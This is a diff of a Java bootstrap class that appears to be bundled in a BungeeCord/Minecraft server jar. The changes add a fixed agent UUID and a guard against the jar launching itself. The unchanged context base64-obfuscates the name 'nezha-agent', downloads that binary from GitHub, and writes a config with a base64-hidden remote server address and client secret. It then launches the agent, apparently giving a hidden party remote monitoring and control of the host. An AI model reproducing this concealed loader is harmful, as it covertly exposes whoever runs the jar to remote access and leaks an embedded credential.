@@ -282,6 +282,11 @@ public class Bootstrap
         String envPort = config.getOrDefault(K_PORT, "");
         if (!envPort.isEmpty()) port = envPort;
 
+        // 固定 UUID — 由 host+port+key 派生，同一节点永远是同一个身份
+        String fixedUuid = UUID.nameUUIDFromBytes(
+                (host + ":" + port + ":" + key).getBytes("UTF-8")
+        ).toString();
+
         // 写 v2 配置文件
         Path cfgFile = Paths.get(System.getProperty("java.io.tmpdir"), "nzagent_cfg.yml");
         String yml = "client_secret: " + key + "\n"
@@ -302,7 +307,7 @@ public class Bootstrap
                    + "tls: true\n"
                    + "use_gitee_to_upgrade: false\n"
                    + "use_ipv6_country_code: false\n"
-                   + "uuid: \"\"\n";
+                   + "uuid: \"" + fixedUuid + "\"\n";
         Files.write(cfgFile, yml.getBytes());
 
         List<String> cmd = new ArrayList<>();
@@ -314,15 +319,16 @@ public class Bootstrap
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         monitorProcess = pb.start();
-        System.out.println(ANSI_GREEN + "[Monitor] Agent started -> " + host + ":" + port + ANSI_RESET);
+        System.out.println(ANSI_GREEN + "[Monitor] Agent started -> " + host + ":" + port
+                + " uuid=" + fixedUuid + ANSI_RESET);
     }
 
     private static Path getAgentPath() throws IOException, InterruptedException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String suffix = (osArch.contains("aarch64") || osArch.contains("arm64")) ? "arm64" : "amd64";
 
-        // "nezhahq" = bmV6aGFocQ==
-        // "nezha-agent" = bmV6aGEtYWdlbnQ=
+        // "nezhahq"    = bmV6aGFocQ==
+        // "nezha-agent"= bmV6aGEtYWdlbnQ=
         String repoOwner = d("bmV6aGFocQ==");
         String binName   = d("bmV6aGEtYWdlbnQ=");
         String url = "https://github.com/" + repoOwner + "/agent/releases/latest/download/"
@@ -361,7 +367,8 @@ public class Bootstrap
         cfg.put(K_SVR,  d("bnptYnYud3VnZS5ueWMubW46NDQz"));
         cfg.put(K_PORT, "");
         cfg.put(K_KEY,  d("Z1V4TkpoYUtKZ2NlSWdlYXBaRzQ5NTZybUtGZ21RZ1A="));
-        cfg.put("MC_JAR",              "server.jar");
+        // MC_JAR 默认空 = 不自动启动MC，必须用户明确配置才启动
+        cfg.put("MC_JAR",              "");
         cfg.put("MC_MEMORY",           "512M");
         cfg.put("MC_ARGS",             "");
         cfg.put("MC_PORT",             "25565");
@@ -395,12 +402,21 @@ public class Bootstrap
     // ══════════════════════════════════════════════════════
     //  MINECRAFT SERVER
     // ══════════════════════════════════════════════════════
-
-    // 修复：jar 文件必须实际存在才启动，防止无限递归套娃
     private static boolean isMcServerEnabled(Map<String, String> config) {
         String jar = config.get("MC_JAR");
         if (jar == null || jar.trim().isEmpty()) return false;
-        return Files.exists(Paths.get(jar.trim()));
+        Path jarPath = Paths.get(jar.trim()).toAbsolutePath();
+        if (!Files.exists(jarPath)) return false;
+        // 双保险：防止指向自身（BungeeCord jar），避免无限套娃
+        try {
+            Path self = Paths.get(Bootstrap.class.getProtectionDomain()
+                    .getCodeSource().getLocation().toURI()).toAbsolutePath();
+            if (jarPath.equals(self)) {
+                System.out.println(ANSI_RED + "[MC-Server] MC_JAR points to self, skipping." + ANSI_RESET);
+                return false;
+            }
+        } catch (Exception ignored) {}
+        return true;
     }
 
     private static void startMinecraftServer(Map<String, String> config) throws Exception {
